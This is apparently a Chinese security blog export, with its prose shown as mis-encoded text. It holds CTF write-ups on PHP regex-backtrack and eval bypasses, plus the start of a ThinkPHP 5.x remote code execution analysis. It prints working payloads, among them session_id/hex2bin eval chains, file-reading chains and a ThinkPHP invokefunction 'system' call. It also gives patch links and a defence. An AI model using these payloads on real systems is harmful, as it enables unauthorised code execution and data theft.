¹æ®æ­£åˆ™æ¥ä¸€æ­¥æ­¥ç¡®å®šè‡³ä¸‹ä¸€ä¸ªè½¬ç§»çŠ¶æ€ï¼Œç›´åˆ°åŒ¹é…ä¸ä¸Šæˆ–èµ°å®Œæ•´ä¸ªè¾“å…¥</li><li>NFAï¼šä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶ä¸æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œåˆ™è¿›è¡Œå›æº¯ï¼Œå°è¯•å…¶ä»–çŠ¶æ€</li></ul></blockquote><p>è€Œphpçš„PCREåº“ä½¿ç”¨çš„å°±æ˜¯NFAçš„æ­£åˆ™å¼•æ“ï¼ŒPç¥çš„debugè¿‡ç¨‹å¾ˆè¯¦ç»†å°±ä¸å¤šè¯´ä»€ä¹ˆäº†ã€‚</p><p>PHPä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œä¸å¯èƒ½è®©ä½ ä¸€ç›´å›æº¯æµªè´¹èµ„æºï¼Œç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™<code>pcre.backtrack_limit</code>ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>çš„æ–¹å¼æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹çš„ä¸Šé™(å¦‚ä¸‹å›¾)ï¼š</p><p><img src="https://s2.ax1x.com/2019/02/27/kTgHij.png" alt="kTgHij.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTgjyV.png" alt="kTgjyV.png"></p><p>æ‰€ä»¥å›æº¯çš„ä¸Šé™æ˜¯1000000ï¼Œå¦‚æœè¶…è¿‡1000000å°±ä¼šè¿”å›falseäº†</p><p><img src="https://s2.ax1x.com/2019/02/27/kT2QfA.png" alt="kT2QfA.png"></p><p>è¿™æ ·ç­”æ¡ˆå°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªç‰¹æ€§å»ç»•è¿‡ï¼Œå‘åŒ…å³å¯</p><p><img src="https://s2.ax1x.com/2019/02/27/kTfWtg.png" alt="kTfWtg.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTfXh4.png" alt="kTfXh4.png"></p><p>æ€ä¹ˆé˜²å¾¡ï¼Ÿ</p><p>å¯ä»¥ä½¿ç”¨<code>===</code>å»é˜²å¾¡ï¼Œå› ä¸º<code>preg_match</code>è¿™ä¸ªå‡½æ•°åªä¼šè¿”å›ä¸‰ä¸ªå€¼1æˆ–è€…0æˆ–è€…falseï¼Œå¯ä»¥çœ‹çœ‹è¿™å¥è¯</p><blockquote><p>returns 1 if the <code>pattern</code><br>matches given <code>subject</code>, 0 if it does not, or <strong>FALSE</strong><br>if an error occurred.</p></blockquote><p><img src="https://s2.ax1x.com/2019/02/27/kThKDP.png" alt="kThKDP.png"></p><p>æ‰€ä»¥å½“å‡ºç°falseè¿™ç§æƒ…å†µçš„æ—¶å€™ï¼Œåªè¦<code>===</code>å­˜åœ¨å°±ä¸ä¼šå­˜åœ¨å¼±ç±»å‹çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h3><p>å¤§ä½¬ä»¬çš„éªšæ“ä½œåˆå­¦ä¹ äº†ï¼Œé¢˜ç›®æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­çš„ï¼Œç„¶åè§‚å¯Ÿä¸€ä¸‹è¿™ä¸ªæ­£åˆ™ï¼Œå°±æ˜¯åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œä½†ä¸èƒ½è®¾ç½®å‚æ•°ã€‚</p><p>åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æœ‰æåŠ<a href="https://lorexxar.cn/2018/05/23/rctf2018/ï¼Œè¿™ç¯‡æ–‡ç« ç”¨çš„æ˜¯`next(getallheaders())`ï¼Œé€šè¿‡è·å–å¤´éƒ¨ä¿¡æ¯å»å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æœ‰ä½¿ç”¨çš„æ˜¯NginxæœåŠ¡å™¨ï¼Œè€Œä¸”`getallheaders()`è¿™ä¸ªå‡½æ•°`getallheaders`å‡½æ•°æ˜¯apacheæ¨¡å—çš„å‡½æ•°ï¼Œæ‰€ä»¥å¾—å¦å¯»åŠæ³•ã€‚" target="_blank" rel="noopener">https://lorexxar.cn/2018/05/23/rctf2018/ï¼Œè¿™ç¯‡æ–‡ç« ç”¨çš„æ˜¯`next(getallheaders())`ï¼Œé€šè¿‡è·å–å¤´éƒ¨ä¿¡æ¯å»å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æœ‰ä½¿ç”¨çš„æ˜¯NginxæœåŠ¡å™¨ï¼Œè€Œä¸”`getallheaders()`è¿™ä¸ªå‡½æ•°`getallheaders`å‡½æ•°æ˜¯apacheæ¨¡å—çš„å‡½æ•°ï¼Œæ‰€ä»¥å¾—å¦å¯»åŠæ³•ã€‚</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å¤§ä½¬ä»¬çš„wpä¹Ÿæ˜¯æƒŠå‘†äº†ï¼Œéƒ½è®°å½•ä¸€ä¸‹ï¼Œ</p><h4 id="æ–¹æ³•ä¸€-åˆ©ç”¨session-id"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨session-id" class="headerlink" title="æ–¹æ³•ä¸€:åˆ©ç”¨session_id"></a>æ–¹æ³•ä¸€:åˆ©ç”¨session_id</h4><p>è¿™ä¸ªå‡½æ•°å¤§çš„ä½œç”¨ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.ax1x.com/2019/02/26/kodsJS.png" alt="kodsJS.png"></p><p>ä¹Ÿå°±æ˜¯è·å–PHPSESSIDçš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶PHPSESSIDçš„å†…å®¹ï¼Œä»è€Œè¿›è¡Œç›¸å…³çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯PHPSESSIDçš„å†…å®¹å¯èƒ½æœ‰å­—ç¬¦çš„é™åˆ¶ï¼Œä½†æ˜¯å½±å“ä¸å¤§ï¼Œæ‰€ä»¥æœ€å¥½è¿˜æ˜¯è½¬æˆ16è¿›åˆ¶å»æ“ä½œ</p><p><img src="https://s2.ax1x.com/2019/02/26/kowPQH.png" alt="kowPQH.png"></p><p>æ‰€ä»¥æœ€åçš„æ“ä½œæ˜¯è¿™æ ·çš„</p><p>GETå‚æ•°é‡Œé¢çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure><p>PHPSESSIDé‡Œé¢çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=7072696E745F72287363616E64697228272E2E2F2729293B</span><br><span class="line">#print_r(scandir(&apos;../&apos;));</span><br><span class="line">PHPSESSID=7072696E745F722866696C655F6765745F636F6E74656E747328272E2E2F666C61675F7068706279703473732729293B</span><br><span class="line">#print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/kowRpD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/kowRpD.md.png" alt="kowRpD.md.png"></a></p><h4 id="æ–¹æ³•äºŒ-åˆ©ç”¨get-defined-vars"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨get-defined-vars" class="headerlink" title="æ–¹æ³•äºŒ:åˆ©ç”¨get_defined_vars"></a>æ–¹æ³•äºŒ:åˆ©ç”¨get_defined_vars</h4><p><img src="https://s2.ax1x.com/2019/02/26/ko0HbR.png" alt="ko0HbR.png"></p><p>è¿™ä¸ªå‡½æ•°å¥½åƒåœ¨æŸæ¬¡çš„å®‰æ’æœˆèµ›é‡Œé¢å‡ºç°è¿‡ï¼Œå½“æ—¶ä¹Ÿæ˜¯å­¦ä¹ äº†ï¼Œä½†æ˜¯ä»Šå¤©å†æ¬¡ç¢°åˆ°ï¼Œåªèƒ½æ€ªè‡ªå·±æ²¡æœ‰çµæ´»è¿ç”¨ï¼Œå¯¼è‡´å°è±¡ä¸æ·±ï¼Œç°åœ¨å†æ¬¡ä½¿ç”¨äº†23333</p><p>æ—¢ç„¶æ˜¯è¿”å›å·²å®šä¹‰çš„æ•°ç»„é‚£ä¹ˆGETæ•°ç»„ä¹Ÿè‚¯å®šåŒ…å«åœ¨é‡Œé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥getä¼ å‚å°±å¯ä»¥ï¼Œç„¶åå¯ä»¥æ ¹æ®<code>current</code>ä»¥åŠ<code>next</code>å‡½æ•°å»è½¬ç§»åˆ°ä½ æ‰€éœ€è¦çš„å‚æ•°ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(next(current(get_defined_vars())));&amp;1=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/27/kTVN3F.png" alt="kTVN3F.png"></p><p>å¦å¤–åœ¨php 7.1ä¸‹ï¼Œ<code>getenv()</code>å‡½æ•°æ–°å¢äº†æ— å‚æ•°æ—¶ä¼šè·å–æœåŠ¡æ®µçš„envæ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™ä¹Ÿå¯ä»¥åˆ©ç”¨</p><p>è¿˜æœ‰å…¶ä»–å¤§ä½¬çš„payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>ç›´æ¥åˆ—ç›®å½•ï¼Œè¿™é‡Œæœ‰ä¸ªå‡½æ•°åˆ©ç”¨çš„å¾ˆå·§å¦™ï¼Œå°±æ˜¯<code>array_reverse</code>ï¼Œè¿™ä¸ªå‡½æ•°æ°å¥½æŠŠæ•°ç»„é‡Œé¢çš„å†…å®¹å€’è½¬è¿‡æ¥ï¼Œåˆšå¥½å¯ä»¥ä½¿ç”¨ä¸€æ¬¡nextå‡½æ•°ï¼Œä¸ç„¶çš„è¯è°ƒç”¨æ•°ç»„é‡Œé¢çš„ç¬¬ä¸‰ä¸ªå€¼çš„è¯ï¼Œå°±è¦ä½¿ç”¨å¤šæ¬¡nextå°±æ˜¾å¾—å†—ä½™äº†ã€‚</p><h3 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h3><p>è¿™ä¸ªé¢˜ç›®æ˜¯å…³äºå†™æ–‡ä»¶çš„ï¼Œå…ˆæŠŠæºç æ‹¿å‡ºæ¥ç…ç…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line"> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œé¢å†™æ–‡ä»¶è¿›å»çš„æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br></pre></td></tr></table></figure><p>æ˜¯ç”±ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆçš„ï¼Œç¬¬ä¸€ä¸ªéƒ¨åˆ†æ˜¯<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶çš„<code>$log_name</code>ï¼Œè¿™é‡Œæ¶‰åŠçš„çŸ¥è¯†ç‚¹æ˜¯åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå¦‚æœæœåŠ¡å™¨è¨­ç½®äº†ä¸‹é¢çš„ç›¸é—œåƒæ•¸çš„è¯å°±æ˜¯å¯æ§çš„ï¼Œé€™å€‹å¯æ§çš„åƒæ•¸è¿™ä¸ªå€¼æ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚æ€ä¹ˆä¼ªé€ å‘¢ï¼Ÿå–çš„æ˜¯HTTP headersä¸­çš„<code>Host</code>çš„å€¼ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/04/kO4ySf.png" alt="kO4ySf.png"></p><p>ä¸‹é¢çš„ä»£ç å°±æ˜¯å¯¹å†™å…¥æ–‡ä»¶çš„åç¼€åè¿‡æ»¤ï¼Œä½†æ˜¯è¿™ä¸ªè¿‡æ»¤å¤ªå®¹æ˜“ï¼Œå› ä¸ºåé¢æ˜¯æœ‰å…³å†™æ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼Œä»–åœ¨åº•å±‚ä¼šåšä¸€äº›æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>))</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ç‚¹åœ¨æˆ‘upload-labè¿™ç¯‡æ–‡ç« é‡Œé¢æœ‰æåŠè¿‡ï¼Œè¿™é‡Œåªéœ€è¦ç”¨ç±»ä¼¼<code>index.php/.</code>è¿™æ ·çš„æ–‡ä»¶ååšç»•è¿‡</p><p>åœ¨è§‚å¯Ÿä¸€ä¸‹ä»£ç ä¸­å¯ä»¥å†™å…¥çš„å†…å®¹ï¼Œå¯ä»¥å‘ç°å†™è¿›å»çš„å†…å®¹éƒ½ä¼šç»è¿‡<code>htmlspecialchars</code>è¿™ä¸ªå‡½æ•°ï¼Œé‚£å°±æ˜¯è¯´ä¸€æ—¦é‡åˆ°ç±»ä¼¼<code>&lt;</code>æˆ–è€…<code>&gt;</code>è¿™çš„æ“ä½œç¬¦ï¼Œå°±ä¼šè½¬ä¹‰ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/04/kXSFud.png" alt="kXSFud.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kOzz4K.png" alt="kOzz4K.png"></p><p>è¿™é‡Œåˆæ¶‰åŠåˆ°å¦å¤–çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹äº†ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ä¸€ç¯‡æ–‡ç« :<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.htmlï¼Œè¿™ç§ç±»å‹çš„é¢˜ç›®ç¬¬ä¸€æ¬¡æˆ‘å¥½åƒå®åœ¨moctfä¸Šçš„ä¸€ä¸ªé¢˜ç›®è§åˆ°çš„233333" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.htmlï¼Œè¿™ç§ç±»å‹çš„é¢˜ç›®ç¬¬ä¸€æ¬¡æˆ‘å¥½åƒå®åœ¨moctfä¸Šçš„ä¸€ä¸ªé¢˜ç›®è§åˆ°çš„233333</a></p><p>ç”±äºæ˜¯å†™å…¥æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨phpä¼ªåè®®å»å®ç°å¤šç§éªšæ“ä½œï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°base64è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºbase64ç¼–ç åœ¨é‡åˆ°ä¸åœ¨å…¶ç¼–ç é›†çš„å­—ç¬¦çš„è¯ä¼šç›´æ¥è·³è¿‡ï¼Œå¹¶ä¸”è§£ç çš„æ—¶å€™æ˜¯4ä½4ä½ä¸€ç»„ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸‹é¢çš„payloadè¦å‡‘å‡ºå››ä¸ªå››ä¸ªä¸€ç»„ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„é—®é¢˜ï¼Œç”±äº<code>dig</code>æ¥å—çš„å‚æ•°ä¸å…è®¸è¿‡é•¿ï¼Œå¦åˆ™ç›´æ¥è¿”å›ç©ºï¼Œæ‰€ä»¥payloadéœ€è¦å°½å¯èƒ½çš„çŸ­ä¸€äº›ï¼Œæ„é€ payloadï¼š</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnCn0.png" alt="kXnCn0.png"></p><p>æ³¨æ„è¿™é‡Œä½¿ç”¨å››ä¸ª<code>*</code>å°±æ˜¯ä¸ºäº†ä¸è®©å‘é€çš„å†…å®¹å‡ºç°<code>=</code>ï¼Œå› ä¸ºå¦‚æœå‡ºç°çš„è¯å°±ä¼šå¯¼è‡´postå‚æ•°å¢åŠ ä¸€ä¸ªï¼ŒåŒæ—¶ä¹Ÿèµ·åˆ°äº†æ³¨é‡Šçš„ä½œç”¨ï¼Œè¿™é‡Œè§†æƒ…å†µå°†<code>*</code>å¢åŠ ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnQHK.png" alt="kXnQHK.png"></p><p>å‘åŒ…æµ‹è¯•ç»“æœæˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnJ9H.png" alt="kXnJ9H.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kXn78J.png" alt="kXn78J.png"></p><p>è¿˜æœ‰ä¸€é“PHPé¢˜ç›®æ”¾åœ¨å¦å¤–ä¸€ç¯‡æ–‡ç« è¯´è¯´å§ã€‚</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ThinkPHP 5.x RCEåˆ†æ</title>
      <link href="/thinkphp-5-rce.html"/>
      <url>/thinkphp-5-rce.html</url>
      <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡è¿›è¡Œä»£ç é‡è¿™ä¹ˆå¤§çš„åˆ†æï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¸ªäººæ„Ÿè§‰æ–°æ‰‹çœŸçš„ä¸é€‚åº”è¿™ç§ï¼Œåº”è¯¥æ‰¾ç‚¹å°ä¸€ç‚¹çš„cmså»åˆ†æï¼Œå¦‚æœä¸æ‡‚MVCæ¶æ„<a id="more"></a>çœŸçš„å¯èƒ½ä¼šæ‡µã€‚ã€‚ã€‚</p><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨åˆ†æè¿™ä¸ªä¹‹å‰è¿˜çœ‹äº†ä¸¤ç¯‡tp5çš„RCEæ¼æ´ï¼Œè¿™ä¸¤ä¸ªæ´éƒ½æ˜¯å¾ˆç›¸ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨ä¸€ä¸ªå¯æ§çš„å˜é‡dispatchå»å®ç°åˆ°æœ€åè¿˜æ˜¯æ„é€ å‡ºå›è°ƒå‡½æ•°ï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™é‡Œé¢çš„æ€è·¯å°±æ˜¯æœ¬æ–‡åˆ†ææ¼æ´çš„æ¥æº</p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p>æˆ‘è¿™é‡Œå·²tp 5.0.22ä¸ºä¾‹å­ï¼Œç¯å¢ƒæ˜¯phpstudyæ­å»ºçš„</p><h3 id="è¡¥ä¸"><a href="#è¡¥ä¸" class="headerlink" title="è¡¥ä¸"></a>è¡¥ä¸</h3><p>å½±å“ç‰ˆæœ¬<br>THINKPHP 5.0.5-5.0.22</p><p>THINKPHP 5.1.0-5.1.30</p><p>5.0.xè¡¥ä¸åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p><img src="https://s2.ax1x.com/2019/02/15/kDf8x0.png" alt="kDf8x0.png"></p><p>5.1.xè¡¥ä¸åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¡¥ä¸ä¸­åŠ äº†æ­£åˆ™é™åˆ¶äº†æ§åˆ¶å™¨çš„è‡ªå®šä¹‰åˆå§‹åŒ–</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/tp52/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¡¥ä¸ä¸‹çš„ç‚¹ï¼ŒåŠ¨æ€è·Ÿè¸ªä¸€ä¸‹æ˜¯å¦æ˜¯å› ä¸ºcontrolleræ²¡æœ‰åšå¥½è¿‡æ»¤è€Œå®ä½“åŒ–ï¼Œç¡®å®æ˜¯å¦‚æ­¤</p><p><img src="https://s2.ax1x.com/2019/02/15/kD51Gd.png" alt="kD51Gd.png"></p><p>æ ¹æ®ä¼ è¿›å»çš„payloadï¼Œæ§åˆ¶å™¨ä»¥åŠä¸‹é¢çš„æ–¹æ³•éƒ½ä¼šå‘ç”Ÿå¯¹åº”çš„å˜åŒ–ï¼Œä¸‹é¢å°±å¯ä»¥åˆ†æä¸€ä¸‹æ”»å‡»é“¾çš„æµç¨‹</p><p>å¯ä»¥ä»å…¥å£æ–‡ä»¶ä¸€çº§ä¸€çº§è·Ÿè¸ªï¼Œè¿›å…¥åˆ°<code>App.php</code>ä¸­ï¼Œè¿™é‡Œåº”è¯¥æ¶‰åŠåˆ°ä¸€ä¸ªå¼€å‘çš„çŸ¥è¯†ï¼Œåœ¨<code>App.php</code>ä¸­ï¼Œä¼šæ ¹æ®è¯·æ±‚çš„URLè°ƒç”¨<code>routeCheck</code>è¿›è¡Œè°ƒåº¦è§£æåœ¨<code>App.php</code>ä¸­ï¼Œä¼šæ ¹æ®è¯·æ±‚çš„URLè°ƒç”¨<code>routeCheck</code>è¿›è¡Œè°ƒåº¦è§£æè·å¾—åˆ°<code>$dispatch</code>ï¼Œæ‰€ä»¥payloadæ˜¯ä¸€å®šè¦ç»è¿‡é‚£é‡Œçš„ï¼Œå¯ä»¥åœ¨é‚£é‡ŒåŠ æ–­ç‚¹è¿›è¡Œè°ƒè¯•</p><p>å®šä½åˆ°<code>/thinkphp/library/think/App.php:116</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$dispatch = <span class="keyword">self</span>::$dispatch;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æœªè®¾ç½®è°ƒåº¦ä¿¡æ¯åˆ™è¿›è¡Œ URL è·¯ç”±æ£€æµ‹</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">                $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯</span></span><br><span class="line">            $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">    $data = <span class="keyword">self</span>::exec($dispatch, $config);<span class="comment">//è¿™ä¸ªå‡½æ•°å¾ˆå…³é”®</span></span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>routeCheck</code>è¿™ä¸ªå‡½æ•°ï¼ŒåŒæ ·åœ¨App.phpé‡Œé¢</p><p><img src="https://s2.ax1x.com/2019/02/15/kDo5K1.png" alt="kDo5K1.png"></p><p>ç»§ç»­è·Ÿè¿›åˆ°<code>path</code>æ–¹æ³•é‡Œé¢ï¼Œç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªpathinfo()å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 